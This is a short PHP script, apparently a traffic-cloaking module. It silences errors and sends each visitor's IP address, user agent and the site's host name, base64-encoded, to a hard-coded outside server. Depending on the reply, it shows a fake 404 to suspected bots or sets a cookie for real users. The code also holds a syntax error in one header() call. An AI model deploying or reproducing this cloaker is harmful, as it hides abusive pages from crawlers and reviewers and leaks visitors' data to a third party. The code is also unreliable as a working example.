<?php

$url = "http://tndns.net/inc/mods/cloaka/remote.php";
$id = "0uclh021";

error_reporting(0);

$is_bot = checkIfBot($url, $id);

function checkIfBot($url, $id)
{
	if(!function_exists("getUserIP"))
	{
		function getUserIP()
		{
			$keys = [
				"HTTP_X_REAL_IP",
				"HTTP_CLIENT_IP",
				"HTTP_X_FORWARDED_FOR",
				"HTTP_X_FORWARDED",
				"HTTP_X_CLUSTER_CLIENT_IP",
				"HTTP_FORWARDED_FOR",
				"HTTP_FORWARDED",
				"REMOTE_ADDR",
				"HTTP_X_REMOTECLIENT_IP"
			];
			foreach($keys as $key)
			{
				if(filter_var($_SERVER[$key], FILTER_VALIDATE_IP))
					return $_SERVER[$key];
			}
			return false;
		}
	}

	$userIp = getUserIP();
	$userAgent = getenv("HTTP_USER_AGENT");
	$result = @file_get_contents($url."?data=".base64_encode($_SERVER["HTTP_HOST"]."||".$userIp."||".$userAgent."||".$id));

	if($result)
	{
		$json = json_decode($result, 1);
		if($json["is"] == "banned_bot" || !empty($json["error"]))
		{
			header("HTTP/1.1 404 Not Found";
			header("Status: 404 Not Found");
			exit("404 Not Found");
		}

		if(!empty($json["js"]) and $json["is"] == "user")
			setcookie("c", 1);

		if ($json["is"] == "user")
			unset($json["is"]);

		return $json["is"];
	}
	return true;
}

